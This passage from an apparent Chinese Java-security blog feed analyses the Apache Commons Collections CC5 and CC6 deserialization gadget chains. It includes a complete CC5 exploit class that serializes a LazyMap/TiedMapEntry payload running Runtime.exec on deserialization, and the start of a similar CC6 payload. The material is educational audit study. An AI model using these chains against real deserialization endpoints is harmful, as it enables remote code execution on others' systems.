方法进行序列化。</p><p>不在显示的调用getter方法了</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://cloud.tencent.com/developer/article/2441950">FastJson1&amp;FastJson2 反序列化利用链分析-腾讯云开发者社区-腾讯云</a></p><p><a href="https://xz.aliyun.com/news/17133">fastjson 原生反序列化链分析-先知社区</a></p><p><a href="https://www.163.com/dy/article/DMAD0T6P05119F6V.html">JRE8u20 反序列化漏洞分析_网易订阅</a></p><p><a href="https://blog.kaibro.tw/2020/02/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BreadObject%E5%88%86%E6%9E%90/">Java 反序列化之 readObject 分析 | Kaibro’s blog</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>fastjson系列</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-CC5 链审计笔记</title>
    <link href="/2025/04/02/java-CC5-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/02/java-CC5-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="java-CC5-链审计笔记"><a href="#java-CC5-链审计笔记" class="headerlink" title="java-CC5 链审计笔记"></a>java-CC5 链审计笔记</h1><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>来自 ysoserial 的注释描述</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs css">Gadget chain:<br>       ObjectInputStream.<span class="hljs-built_in">readObject</span>()<br>           BadAttributeValueExpException.<span class="hljs-built_in">readObject</span>()<br>               TiedMapEntry.<span class="hljs-built_in">toString</span>()<br>                   LazyMap.<span class="hljs-built_in">get</span>()<br>                       ChainedTransformer.<span class="hljs-built_in">transform</span>()<br>                           ConstantTransformer.<span class="hljs-built_in">transform</span>()<br>                           InvokerTransformer.<span class="hljs-built_in">transform</span>()<br>                               Method.<span class="hljs-built_in">invoke</span>()<br>                                   Class.<span class="hljs-built_in">getMethod</span>()<br>                           InvokerTransformer.<span class="hljs-built_in">transform</span>()<br>                               Method.<span class="hljs-built_in">invoke</span>()<br>                                   Runtime.<span class="hljs-built_in">getRuntime</span>()<br>                           InvokerTransformer.<span class="hljs-built_in">transform</span>()<br>                               Method.<span class="hljs-built_in">invoke</span>()<br>                                   Runtime.<span class="hljs-built_in">exec</span>()<br><br>Requires:<br>commons-collections<br></code></pre></td></tr></table></figure><blockquote><p>This only works in JDK 8u76 and WITHOUT a security manager</p><p><a href="https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70">https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</a></p></blockquote><p>其实 <code>CC5</code> 和 我们经典的 <code>CC6</code> 是大相径庭的，只是调用了不同的 <code>TiedMapEntry</code> 方法，在 <code>CC6</code> 中 是从<code>TiedMapEntry.hashCode()</code> &#x3D;&gt; <code>TiedMapEntry.getValue()</code> &#x3D;&gt; <code>LazyMap.get()</code></p><h2 id="链条分析"><a href="#链条分析" class="headerlink" title="链条分析"></a>链条分析</h2><p>我们在 <code>LazyMap#get</code> 方法，查找用法，找到了 <code>TiedMapEntry.getValue()</code> 有调用</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250402185614936.png" alt="image-20250402185614936"></p><p>进入到 TiedMapEntry 看看哪里调用了 getValue() 方法，发现有三处方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object obj)</span> &#123;<br>    <span class="hljs-keyword">if</span> (obj == <span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> Map.Entry == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">other</span> <span class="hljs-operator">=</span> (Map.Entry) obj;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span><br>        (key == <span class="hljs-literal">null</span> ? other.getKey() == <span class="hljs-literal">null</span> : key.equals(other.getKey())) &amp;&amp;<br>        (value == <span class="hljs-literal">null</span> ? other.getValue() == <span class="hljs-literal">null</span> : value.equals(other.getValue()));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>        (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的 <code>CC6</code> 正是用到了 <code>hashCode()</code> 方法，而在我们的<code>CC5</code> 中使用到 <code>toString()</code>  方法</p><p>找到了 <code> BadAttributeValueExpException.readObject()</code> 这个方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250402191004381.png" alt="image-20250402191004381"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>        val = <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>        val= valObj;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>               || valObj <span class="hljs-keyword">instanceof</span> Long<br>               || valObj <span class="hljs-keyword">instanceof</span> Integer<br>               || valObj <span class="hljs-keyword">instanceof</span> Float<br>               || valObj <span class="hljs-keyword">instanceof</span> Double<br>               || valObj <span class="hljs-keyword">instanceof</span> Byte<br>               || valObj <span class="hljs-keyword">instanceof</span> Short<br>               || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>        val = valObj.toString();<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看到 <code>valObj.toString()</code> 我们只需要通过反射来获取到</p><p>为什么需要反射？</p><blockquote><p>在 BadAttributeValueExpException 的构造方法，也执行了 val.toString() 方法，在序列化的时候，不用反射的话，恶意代码会在我们本机执行。</p><p>而在 val.toString() 方法执行后，我们的 val 就不是Object类型了，而是String类型。无法调用后续的链条</p><p>public BadAttributeValueExpException (Object val) {<br>        this.val &#x3D; val &#x3D;&#x3D; null ? null : val.toString();<br>}</p></blockquote><p>我们依然可以调试一下，试着直接在构造参数中传递 tiedMapEntry</p><blockquote><p>BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(tiedMapEntry);</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250402203555974.png" alt="image-20250402203555974"></p><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheCC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">()</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LazyMap</span>&gt; Clazz = (Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LazyMap</span>&gt;) lazyMap.getClass();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> Clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>            factory.setAccessible(<span class="hljs-literal">true</span>);<br>            factory.set(lazyMap, transformerChain);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(badAttributeValueExpException, tiedMapEntry);<br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cc5.ser&quot;</span>);<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>            objectOutputStream.writeObject(badAttributeValueExpException);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deser</span><span class="hljs-params">(File file)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>            ois.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 序列化</span><br>        ser();<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">projectDir</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>);<br>        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(projectDir, <span class="hljs-string">&quot;cc5.ser&quot;</span>);<br>        deser(path.toFile());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250402202607185.png" alt="image-20250402202607185"></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Apache-CC链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Apache-CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-CC6 链审计笔记</title>
    <link href="/2025/04/02/java-CC6-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/02/java-CC6-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="java-CC6链审计笔记"><a href="#java-CC6链审计笔记" class="headerlink" title="java-CC6链审计笔记"></a>java-CC6链审计笔记</h1><h2 id="一、审计过程"><a href="#一、审计过程" class="headerlink" title="一、审计过程"></a>一、审计过程</h2><h3 id="1、lazyMap"><a href="#1、lazyMap" class="headerlink" title="1、lazyMap"></a>1、lazyMap</h3><p>在之前<a href="">CC1的审计</a>中发现ChainedTransformer的transform方法还可以被LazyMap的get方法调用</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250218210701660.png" alt="image-20250218210701660"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>所以只要令factory的值为ChainedTransformer对象，则可以实现调用。而protected final Transformer factory; 则定义了factory是一个类属性，所以只要能够通过构造方法对类属性进行赋值，则可以实现对象的传递。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>    <span class="hljs-built_in">super</span>(map);<br>    <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">this</span>.factory = factory;<br>&#125;<br></code></pre></td></tr></table></figure><p>同时，还需要令 if (map.containsKey(key) &#x3D;&#x3D; false) 条件满足，则说明Map对象中不能包含对应的Key值，则才会进入If语句中进行调用。</p><h3 id="CC1扩展"><a href="#CC1扩展" class="headerlink" title="CC1扩展"></a>CC1扩展</h3><p>接下来寻找谁在调用LazyMap的get方法，通过Find Usage找到了3000多个匹配的地方，其中也包含AnnotationInvocationHandler</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250219091551285.png"></p><p>其实这也是CC1链的一个扩展，但是由于仍然是对AnnotationInvocationHandler进行反序列化，同样不适用于新版本JDK，所以该链不进行审计。</p><h3 id="2、TiedMapEntry"><a href="#2、TiedMapEntry" class="headerlink" title="2、TiedMapEntry"></a>2、TiedMapEntry</h3><p>发现Common Collections库中的TiedMapEntry调用了get方法。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250219091945857.png" alt="image-20250219091945857"></p><p>谁在调用getValue方法，发现同类中的hashCode方法在调用。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250219092303638.png" alt="image-20250219092303638"></p><p>而哪里有hashCode呢，其实在审计UrlDNS链时已经知道了，HashMap就存在hashCode方法，且HashMap本身就重写了readObject，可以较好地实现反序列化和自动调用。所以CC6相对是比较容易理解的，而且不依赖于JDK版本，实用性也很高。目前确定的调用链如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectInputStream</span><span class="hljs-selector-class">.readObject</span>()<br>        java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.put</span>()<br>        java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.hashCode</span>()<br>            org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.hashCode</span>()<br>            org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.getValue</span>()<br>                org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span>()<br>                    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span>()<br>                    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span>()<br>                        java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>()<br>                            java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.exec</span>()<br></code></pre></td></tr></table></figure><h2 id="二、编写链条利用"><a href="#二、编写链条利用" class="headerlink" title="二、编写链条利用"></a>二、编写链条利用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheCC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">CC6_ser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// transformer[]数组,相当于一下代码的执行。</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="hljs-comment">        Method method = runtimeClass.getMethod(&quot;getRuntime&quot;, null);</span><br><span class="hljs-comment">        Runtime runtime = (Runtime) method.invoke(null);</span><br><span class="hljs-comment">        runtime.exec(&quot;calc.exe&quot;);</span><br><span class="hljs-comment">    */</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">// 1.相当于Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 2.相当于Method method = runtimeClass.getMethod(&quot;getRuntime&quot;, null);</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 3.相当于runtime = (Runtime) method.invoke(null);</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 4.相当于runtime.exec(&quot;calc.exe&quot;);</span><br>                <span 